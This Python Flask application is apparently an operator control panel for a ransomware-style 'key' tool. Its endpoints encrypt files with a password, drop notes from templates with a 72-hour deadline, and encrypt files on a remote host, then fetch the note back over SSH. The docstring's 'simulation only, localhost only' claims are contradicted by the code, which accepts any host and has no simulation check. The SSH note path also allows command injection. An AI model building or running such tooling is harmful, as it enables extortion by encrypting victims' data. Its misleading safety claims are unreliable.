#!/usr/bin/env python3
"""
0xPo11 ****Control Panel****.

SIMULATION ONLY. Authorized lab systems only. Only localhost (127.0.0.1) is
targeted; no external hosts and no destructive automation outside the lab.

Endpoints:
  GET  /                 dashboard
  POST /run/fe           run `key fe ...`
  POST /run/note         run `key rn ...`
  POST /run/remote       run `key fe --host ...`
  POST /run/term         run arbitrary `key <cipher> ...`

All commands are executed through the installed `key` binary via subprocess.
Simulation mode (checked in the UI) skips execution and only renders the
command that would have run.
"""

from __future__ import annotations

import shlex
import shutil
import subprocess
from pathlib import Path
from typing import List
import os

from flask import Flask, jsonify, render_template, request

app = Flask(__name__, template_folder="templates")

KEY_BIN = os.path.expanduser("~/.local/bin/key")
if not os.path.exists(KEY_BIN):
    KEY_BIN = shutil.which("key") or "key"


def run_key(args: List[str]) -> str:
    """Run the `key` CLI with the given arguments and return captured output."""
    cmd = [KEY_BIN] + args
    run_env = dict(os.environ)
    run_env.setdefault("HOME", str(Path.home()))
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
            env=run_env,
        )
        out = proc.stdout or ""
        err = proc.stderr or ""
        if proc.returncode != 0:
            return f"exit {proc.returncode}\n{out}{err}"
        return out
    except FileNotFoundError:
        return "error: key command not found"
    except subprocess.TimeoutExpired:
        return "error: command timed out"


@app.get("/")
def index():
    return render_template("control_panel.html")


@app.post("/run/fe")
def run_fe():
    body = request.get_json(force=True) or {}
    mode = body.get("mode", "encrypt")
    endpoint = body.get("endpoint", "local")
    input_path = body.get("input", "")
    output_path = body.get("output", "")
    password = body.get("password", "")
    template = body.get("template", "generic")
    drop = body.get("drop", False)
    local_in = body.get("localIn", False)
    local_out = body.get("localOut", False)

    args: List[str] = ["fe"]
    if mode == "decrypt":
        args.append("-d")
    else:
        args.append("-e")
    args += ["-i", input_path, "-o", output_path, "-k", password]
    if endpoint == "remote":
        args += ["--host", "127.0.0.1"]
    if local_in:
        args.append("--local-in")
    if local_out:
        args.append("--local-out")
    if drop:
        args += ["--drop-note", template]

    return jsonify({"output": run_key(args)})



@app.post("/run/note")
def run_note():
    body = request.get_json(force=True) or {}
    template = body.get("template", "press")
    dl = body.get("dl", "72")
    password = body.get("password", "")
    input_path = body.get("input", "")
    output_path = body.get("output", "")

    args = [
        "rn",
        "-e",
        "-i",
        input_path,
        "-k",
        password,
        "-tm",
        template,
        "-dl",
        dl,
        "-o",
        output_path,
    ]
    return jsonify({"output": run_key(args)})


@app.post("/run/remote")
def run_remote():
    body = request.get_json(force=True) or {}
    host = body.get("host", "")
    input_path = body.get("input", "")
    output_path = body.get("output", "")
    password = body.get("password", "")
    timeout = body.get("timeout", "30")
    direction = body.get("dir", "encrypt remote→local")
    drop = body.get("drop", False)
    note_tmpl = body.get("noteTmpl", "press")
    note_path = body.get("notePath", "NOTE.txt")
    local_in = body.get("localIn", False)
    local_out = body.get("localOut", False)

    args: List[str] = ["fe"]
    if direction.startswith("decrypt"):
        args.append("-d")
    else:
        args.append("-e")
    args += [
        "--host",
        host,
        "-i",
        input_path,
        "-o",
        output_path,
        "-k",
        password,
        "--timeout",
        timeout,
    ]
    if local_in:
        args.append("--local-in")
    if local_out:
        args.append("--local-out")
    if drop:
        args += ["--drop-note", note_tmpl, "--note-out", note_path]

    output = run_key(args)
    app.logger.debug("RAN: key %s", " ".join(args))
    app.logger.debug("OUTPUT: %s", output[:500])
    result: dict = {"output": output}

    # If encryption succeeded and a note was dropped, cat it from the remote host.
    if drop and not direction.startswith("decrypt") and "failed" not in output.lower():
        note_cmd = ["ssh", host, f"cat '{note_path}'"]
        ssh_env = dict(os.environ)
        ssh_env.setdefault("HOME", str(Path.home()))
        try:
            proc = subprocess.run(
                note_cmd,
                capture_output=True,
                text=True,
                timeout=30,
                env=ssh_env,
            )
            if proc.returncode == 0:
                result["note"] = proc.stdout
                result["notePath"] = note_path
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    return jsonify(result)


@app.post("/run/term")
def run_term():
    body = request.get_json(force=True) or {}
    raw = body.get("cmd", "")
    if not raw:
        return jsonify({"output": "error: empty command"})
    args = shlex.split(raw)
    return jsonify({"output": run_key(args)})


if __name__ == "__main__":
    # Localhost-only by default for lab safety.
    app.run(host="127.0.0.1", port=8765, debug=False)
